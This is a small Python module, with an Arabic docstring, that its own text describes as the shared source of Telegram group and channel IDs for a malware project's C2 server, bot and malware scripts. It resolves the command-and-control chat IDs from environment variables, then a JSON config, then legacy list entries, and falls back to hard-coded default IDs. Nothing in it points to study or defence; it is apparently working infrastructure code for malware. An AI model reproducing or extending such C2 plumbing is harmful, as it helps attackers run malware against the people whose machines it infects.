"""
معرفات جروب وقناة بروتوكول المالوير — مصدر واحد لـ c2_server / bot.py / malware.py.
الأولوية: متغيرات البيئة ثم مفاتيح ملف telegram_config.json ثم عناصر chat_ids[1] و [2] (legacy).
"""
from __future__ import annotations

import os
from typing import Any, Mapping

DEFAULT_GROUP = "-1002470378114"
DEFAULT_CHANNEL = "-1002426552780"


def resolve_c2_chats(cfg: Mapping[str, Any] | None) -> tuple[str, str]:
    cfg = cfg or {}
    g = (
        os.environ.get("C2_GROUP_ID", "").strip()
        or os.environ.get("MALWARE_GROUP_ID", "").strip()
        or str(cfg.get("c2_group_id") or cfg.get("malware_group_id") or "").strip()
    )
    c = (
        os.environ.get("C2_CHANNEL_ID", "").strip()
        or os.environ.get("MALWARE_CHANNEL_ID", "").strip()
        or str(cfg.get("c2_channel_id") or cfg.get("malware_channel_id") or "").strip()
    )
    chats = cfg.get("chat_ids") or []
    if isinstance(chats, list) and len(chats) >= 3:
        if not g:
            g = str(chats[1]).strip()
        if not c:
            c = str(chats[2]).strip()
    return g or DEFAULT_GROUP, c or DEFAULT_CHANNEL
